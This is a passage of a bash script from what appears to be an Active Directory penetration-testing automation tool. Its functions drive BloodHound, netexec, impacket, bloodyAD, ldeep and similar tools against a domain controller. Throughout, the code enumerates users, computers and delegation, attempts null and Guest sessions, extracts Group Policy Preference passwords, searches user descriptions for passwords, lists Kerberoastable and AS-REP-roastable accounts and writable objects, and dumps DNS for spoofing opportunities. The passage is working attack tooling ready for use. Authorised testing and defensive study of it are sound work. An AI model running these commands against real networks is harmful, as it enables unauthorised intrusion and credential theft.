Enumeration using DCOnly${NC}\"\n        if [ -n \"$(find \"${output_dir}/DomainRecon/BloodHound/\" -type f -name '*.json' -print -quit)\" ]; then\n            echo -e \"${YELLOW}[i] BloodHound results found, skipping... ${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] BloodHound requires credentials${NC}\"\n            else\n                current_dir=$(pwd)\n                cd \"${output_dir}/DomainRecon/BloodHound\" || exit\n                if [ \"${ldapbinding_bool}\" == true ]; then ldapbinding_param=\"--ldap-channel-binding\"; else ldapbinding_param=\"\"; fi\n                if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--use-ldaps ${ldapbinding_param}\"; else ldaps_param=\"\"; fi\n                run_command \"${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}\" | tee \"${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n                #run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c DCOnly --log tee ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt\" 2>&1\n                /usr/bin/jq -r \".data[].Properties.samaccountname| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHound/*_users.json 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt\"\n                /usr/bin/jq -r \".data[].Properties.name| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >\"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt\"\n                parse_users\n                parse_servers\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nbhdce_enum() {\n    if [ ! -f \"${bloodhoundce}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of BloodHoundCE${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/BloodHoundCE\"\n        echo -e \"${BLUE}[*] BloodHoundCE Enumeration using all collection methods (Noisy!)${NC}\"\n        if [ -n \"$(find \"${output_dir}/DomainRecon/BloodHoundCE/\" -type f -name '*.json' -print -quit)\" ]; then\n            echo -e \"${YELLOW}[i] BloodHoundCE results found, skipping... ${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] BloodHoundCE requires credentials${NC}\"\n            else\n                current_dir=$(pwd)\n                cd \"${output_dir}/DomainRecon/BloodHoundCE\" || exit\n                run_command \"${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}\" | tee \"${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n                /usr/bin/jq -r \".data[].Properties.samaccountname| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt\"\n                /usr/bin/jq -r \".data[].Properties.name| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHoundCE/*_computers.json 2>/dev/null >\"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt\"\n                /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains(\"MSSQL\")).serviceprincipalnames[]' \"${output_dir}\"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null | cut -d \"/\" -f 2 | cut -d \":\" -f 1 | sort -u >\"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt\"\n                parse_users\n                parse_servers\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nbhdce_enum_dconly() {\n    if [ ! -f \"${bloodhoundce}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of BloodHoundCE${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/BloodHoundCE\"\n        echo -e \"${BLUE}[*] BloodHoundCE Enumeration using DCOnly${NC}\"\n        if [ -n \"$(find \"${output_dir}/DomainRecon/BloodHoundCE/\" -type f -name '*.json' -print -quit)\" ]; then\n            echo -e \"${YELLOW}[i] BloodHoundCE results found, skipping... ${NC}\"\n        else\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] BloodHoundCE requires credentials${NC}\"\n            else\n                current_dir=$(pwd)\n                cd \"${output_dir}/DomainRecon/BloodHoundCE\" || exit\n                run_command \"${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN}\" | tee \"${output_dir}/DomainRecon/BloodHoundCE/bloodhound_output_dconly_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n                /usr/bin/jq -r \".data[].Properties.samaccountname| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHoundCE/*_users.json 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_bhdce_${dc_domain}.txt\"\n                /usr/bin/jq -r \".data[].Properties.name| select( . != null )\" \"${output_dir}\"/DomainRecon/BloodHoundCE/*_computers.json 2>/dev/null >\"${output_dir}/DomainRecon/Servers/servers_list_bhdce_${dc_domain}.txt\"\n                parse_users\n                parse_servers\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nldapdomaindump_enum() {\n    if [ ! -f \"${ldapdomaindump}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of ldapdomaindump${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/LDAPDomainDump\"\n        echo -e \"${BLUE}[*] ldapdomaindump Enumeration${NC}\"\n        if [ -n \"$(find \"${output_dir}/DomainRecon/LDAPDomainDump/\" -type f -name '*.json' -print -quit)\" ]; then\n            echo -e \"${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}\"\n        else\n            if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] ldapdomaindump does not support Kerberos authentication ${NC}\"\n            else\n                if [ \"${ldapbinding_bool}\" == true ]; then ldapbinding_param=\"--ldap-channel-binding\"; else ldapbinding_param=\"\"; fi\n                if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"${ldapbinding_param} ldaps\"; else ldaps_param=\"ldap\"; fi\n                run_command \"${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} -o ${output_dir}/DomainRecon/LDAPDomainDump\" | tee \"${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt\"\n            fi\n            /usr/bin/jq -r \".[].attributes.sAMAccountName[]\" \"${output_dir}/DomainRecon/LDAPDomainDump/domain_users.json\" 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_ldd_${dc_domain}.txt\"\n            /usr/bin/jq -r \".[].attributes.dNSHostName[]\" \"${output_dir}/DomainRecon/LDAPDomainDump/domain_computers.json\" 2>/dev/null >\"${output_dir}/DomainRecon/Servers/servers_list_ldd_${dc_domain}.txt\"\n            parse_users\n            parse_servers\n        fi\n    fi\n    echo -e \"\"\n}\n\nenum4linux_enum() {\n    if [ ! -f \"${enum4linux_py}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of enum4linux-ng${NC}\"\n    else\n        echo -e \"${BLUE}[*] enum4linux Enumeration${NC}\"\n        if [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] enum4linux does not support Kerberos authentication using AES Key${NC}\"\n        else\n            run_command \"${enum4linux_py} -A ${argument_enum4linux} ${target} -oJ ${output_dir}/DomainRecon/enum4linux_${dc_domain}\" >\"${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt\"\n            head -n 20 \"${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt\" 2>&1\n            echo -e \"............................(truncated output)\"\n            /usr/bin/jq -r \".users[].username\" \"${output_dir}/DomainRecon/enum4linux_${dc_domain}.json\" 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_enum4linux_${dc_domain}.txt\"\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${CYAN}[*] Guest with empty password (null session)${NC}\"\n                run_command \"${enum4linux_py} -A ${target} -u 'Guest' -p '' -oJ ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}\" >\"${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt\"\n                head -n 20 \"${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt\" 2>&1\n                echo -e \"............................(truncated output)\"\n                /usr/bin/jq -r \".users[].username\" \"${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.json\" 2>/dev/null >\"${output_dir}/DomainRecon/Users/users_list_enum4linux_guest_${dc_domain}.txt\"\n            fi\n        fi\n        parse_users\n    fi\n    echo -e \"\"\n}\n\nne_gpp() {\n    echo -e \"${BLUE}[*] GPP Enumeration${NC}\"\n    run_command \"${netexec} ${ne_verbose} smb ${target_dc} ${argument_ne} -M gpp_autologin -M gpp_password --log ${output_dir}/DomainRecon/ne_gpp_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nne_smb_enum() {\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${BLUE}[*] Users Enumeration (RPC Null session)${NC}\"\n        run_command \"${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${target} -u Guest -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --users --log ${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt\" 2>&1\n        awk '!/\\[-|\\[+|\\[\\*/ && /SMB/ {gsub(/ +/, \" \"); split($12, arr, \"\\\\\"); print arr[2]}' \"${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt\" | grep -v \"-Username-\" >\"${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt\" 2>&1\n    else\n        echo -e \"${BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}\"\n        run_command \"${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt\" 2>&1\n        grep -v \"\\[-\\|\\[+\\|\\[\\*\" \"${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt\" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d \" \" -f 12 | cut -d \"\\\\\" -f 2 | grep -v \"-Username-\" >\"${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} smb ${target} ${argument_ne} --computers\" >\"${output_dir}/DomainRecon/ne_computers_auth_smb_${dc_domain}.txt\"\n    fi\n    parse_users\n    echo -e \"\"\n    echo -e \"${BLUE}[*] Password Policy Enumeration${NC}\"\n    run_command \"${netexec} ${ne_verbose} smb ${target} ${argument_ne} --pass-pol --log ${output_dir}/DomainRecon/ne_passpol_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nne_ldap_enum() {\n    if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--port 636\"; else ldaps_param=\"\"; fi\n    if [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${BLUE}[*] Users Enumeration (LDAP Null session)${NC}\"\n        run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} ldap ${target} -u Guest -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt\" 2>&1\n        run_command \"${netexec} ${ne_verbose} ldap ${target} -u ${rand_user} -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt\" 2>&1\n        grep -vE '\\[-|\\[+|\\[\\*' \"${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt\" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v \"-Username-\" >\"${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt\" 2>&1\n    else\n        echo -e \"${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}\"\n        run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt\" 2>&1\n        grep -vE '\\[-|\\[+|\\[\\*' \"${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt\" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v \"-Username-\" >\"${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt\" 2>&1\n    fi\n    parse_users\n    echo -e \"\"\n    echo -e \"${BLUE}[*] DC List Enumeration${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --dc-list --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt\" 2>&1\n    grep -vE '\\[-|\\[+|\\[\\*' \"${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt\" 2>/dev/null | grep LDAP | awk '{print $12}' >\"${output_dir}/DomainRecon/Servers/dc_list_ne_ldap_${dc_domain}.txt\" 2>&1\n    grep -vE '\\[-|\\[+|\\[\\*' \"${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt\" 2>/dev/null | grep LDAP | awk '{print $14}' >\"${output_dir}/DomainRecon/Servers/dc_ip_list_ne_ldap_${dc_domain}.txt\" 2>&1\n    parse_servers\n    echo -e \"\"\n    echo -e \"\"\n    echo -e \"${BLUE}[*] Password not required Enumeration${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --password-not-required --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_passnotrequired_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n    echo -e \"${BLUE}[*] Users Description containing word: pass${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}\" >\"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt\"\n    grep -i \"pass\\|pwd\" \"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt\" 2>/dev/null | tee \"${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt\" 2>&1\n    if [ ! -s \"${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt\" ]; then\n        echo -e \"${PURPLE}[-] No users with passwords in description found${NC}\"\n    fi\n    echo -e \"\"\n    echo -e \"${BLUE}[*] Get MachineAccountQuota${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M maq --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_MachineAccountQuota_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n    echo -e \"${BLUE}[*] Subnets Enumeration${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M subnets --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_subnets_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n    echo -e \"${BLUE}[*] LDAP-signing check${NC}\"\n    run_command \"${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} -M ldap-checker --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_ldap-checker_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\ndeleg_enum() {\n    if [ ! -f \"${impacket_findDelegation}\" ]; then\n        echo -e \"${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}\"\n    else\n        echo -e \"${BLUE}[*] Impacket findDelegation Enumeration${NC}\"\n        run_command \"${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS}\" | tee \"${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt\"\n        if grep -q 'error' \"${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt\"; then\n            echo -e \"${RED}[-] Errors during Delegation enum... ${NC}\"\n        fi\n    fi\n    echo -e \"${BLUE}[*] findDelegation check (netexec)${NC}\"\n    if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--port 636\"; else ldaps_param=\"\"; fi\n    run_command \"${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --find-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_find-delegation_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n    echo -e \"${BLUE}[*] Trusted-for-delegation check (netexec)${NC}\"\n    if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--port 636\"; else ldaps_param=\"\"; fi\n    run_command \"${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nfqdn_to_ldap_dn() {\n    sed -e 's/[^ ]*/DC=&/g' -e 's/ /,/g' <<<\"${1//./ }\"\n}\n\nbloodyad_all_enum() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/bloodyAD\"\n        echo -e \"${BLUE}[*] bloodyad All Enumeration${NC}\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            domain_DN=$(fqdn_to_ldap_dn \"${dc_domain}\")\n            echo -e \"${CYAN}[*] Searching for attribute msDS-Behavior-Version${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr msDS-Behavior-Version\" | tee \"${output_dir}/DomainRecon/bloodyAD/bloodyad_forestlevel_${dc_domain}.txt\"\n            echo -e \"${CYAN}[*] Searching for attribute ms-DS-MachineAccountQuota${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr ms-DS-MachineAccountQuota\" | tee \"${output_dir}/DomainRecon/bloodyAD/bloodyad_maq_${dc_domain}.txt\"\n            echo -e \"${CYAN}[*] Searching for attribute minPwdLength${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get object ${domain_DN} --attr minPwdLength\" | tee \"${output_dir}/DomainRecon/bloodyAD/bloodyad_minpasslen_${dc_domain}.txt\"\n            echo -e \"${CYAN}[*] Searching for users${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype useronly\" >\"${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt\"\n            cut -d ',' -f 1 \"${output_dir}/DomainRecon/bloodyAD/bloodyad_allusers_${dc_domain}.txt\" | cut -d '=' -f 2 | sort -u >\"${output_dir}/DomainRecon/Users/users_list_bla_${dc_domain}.txt\" 2>/dev/null\n            parse_users\n            echo -e \"${CYAN}[*] Searching for computers${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype computer\" >\"${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt\"\n            cut -d \",\" -f 1 \"${output_dir}/DomainRecon/bloodyAD/bloodyad_allcomp_${dc_domain}.txt\" | cut -d \"=\" -f 2 | sort -u | grep \"\\S\" | sed -e \"s/$/.${dc_domain}/\" >\"${output_dir}/DomainRecon/Servers/servers_list_bla_${dc_domain}.txt\" 2>/dev/null\n            parse_servers\n            echo -e \"${CYAN}[*] Searching for containers${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype container\" >\"${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt\"\n            echo -e \"${CYAN}[*] Searching for Kerberoastable${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName\" | grep sAMAccountName | cut -d ' ' -f 2 | tee \"${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt\"\n            echo -e \"${CYAN}[*] Searching for ASREPRoastable${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName\" | tee \"${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nbloodyad_write_enum() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] bloodyad search for writable objects${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable\" | tee \"${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nbloodyad_dnsquery() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] bloodyad dump DNS entries${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get dnsDump\" | tee \"${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt\"\n            echo -e \"${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}\"\n            sed -n '/[^\\n]*\\*/,/^$/p' \"${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nsilenthound_enum() {\n    if [ ! -f \"${silenthound}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of silenthound${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/SilentHound\"\n        echo -e \"${BLUE}[*] SilentHound Enumeration${NC}\"\n        if [ -n \"$(find \"${output_dir}/DomainRecon/SilentHound/\" -maxdepth 1 -type f ! -name 'silenthound_output' -print -quit)\" ]; then\n            echo -e \"${YELLOW}[i] SilentHound results found, skipping... ${NC}\"\n        else\n            if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] SilentHound does not support Kerberos authentication${NC}\"\n            else\n                current_dir=$(pwd)\n                cd \"${output_dir}/DomainRecon/SilentHound\" || exit\n                if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--ssl\"; else ldaps_param=\"\"; fi\n                run_command \"${python3} ${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain}\" >\"${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt\"\n                cd \"${current_dir}\" || exit\n                cut -d \" \" -f 1 \"${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt\" | sort -u | grep \"\\S\" | sed -e \"s/$/.${dc_domain}/\" >\"${output_dir}/DomainRecon/Servers/servers_list_shd_${dc_domain}.txt\" 2>/dev/null\n                cut -d \" \" -f 2 \"${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt\" >\"${output_dir}/DomainRecon/Servers/ip_list_shd_${dc_domain}.txt\" 2>/dev/null\n                /bin/cp \"${output_dir}/DomainRecon/SilentHound/${dc_domain}-users.txt\" \"${output_dir}/DomainRecon/Users/users_list_shd_${dc_domain}.txt\" 2>/dev/null\n                head -n 20 \"${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt\" 2>/dev/null\n                echo -e \"............................(truncated output)\"\n                echo -e \"${GREEN}[+] SilentHound enumeration complete.${NC}\"\n            fi\n            parse_users\n            parse_servers\n        fi\n    fi\n    echo -e \"\"\n}\n\nldeep_enum() {\n    if [ ! -f \"${ldeep}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of ldeep${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/ldeepDump\"\n        echo -e \"${BLUE}[*] ldeep Enumeration${NC}\"\n        if [ -n \"$(find \"${output_dir}/DomainRecon/ldeepDump/\" -type f -name '*.json' -print -quit)\" ]; then\n            echo -e \"${YELLOW}[i] ldeep results found, skipping... ${NC}\"\n        else\n            if [ \"${aeskey_bool}\" == true ]; then\n                echo -e \"${PURPLE}[-] ldeep does not support Kerberos authentication using AES Key${NC}\"\n            else\n                if [ \"${ldaps_bool}\" == true ] || [ \"${cert_bool}\" == true ]; then ldaps_param=\"-s ldaps://\"; else ldaps_param=\"-s ldap://\"; fi\n                run_command \"${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}\" 2>&1 | tee \"${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt\"\n                /bin/cp \"${output_dir}/DomainRecon/ldeepDump/${dc_domain}_users_all.lst\" \"${output_dir}/DomainRecon/Users/users_list_ldp_${dc_domain}.txt\" 2>/dev/null\n                /bin/cp \"${output_dir}/DomainRecon/ldeepDump/${dc_domain}_computers.lst\" \"${output_dir}/DomainRecon/Servers/servers_list_ldp_${dc_domain}.txt\" 2>/dev/null\n                parse_users\n                parse_servers\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nwindapsearch_enum() {\n    if [ ! -f \"${windapsearch}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of windapsearch${NC}\"\n    else\n        mkdir -p \"${output_dir}/DomainRecon/windapsearch\"\n        echo -e \"${BLUE}[*] windapsearch Enumeration${NC}\"\n        if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] windapsearch does not support Kerberos authentication${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--secure\"; else ldaps_param=\"\"; fi\n            run_command \"${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full\" >\"${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt\"\n            run_command \"${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full\" >\"${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt\"\n            run_command \"${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full\" >\"${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt\"\n            run_command \"${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full\" >\"${output_dir}/DomainRecon/windapsearch/windapsearch_privusers_${dc_domain}.txt\"\n            run_command \"${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=*))'\" >\"${output_dir}/DomainRecon/windapsearch/windapsearch_spn_${dc_domain}.txt\"\n            run_command \"${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(objectCategory=user)(objectClass=user)(distinguishedName=%managedBy%)'\" >\"${output_dir}/DomainRecon/windapsearch/windapsearch_managedby_${dc_domain}.txt\"\n            run_command \"${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName 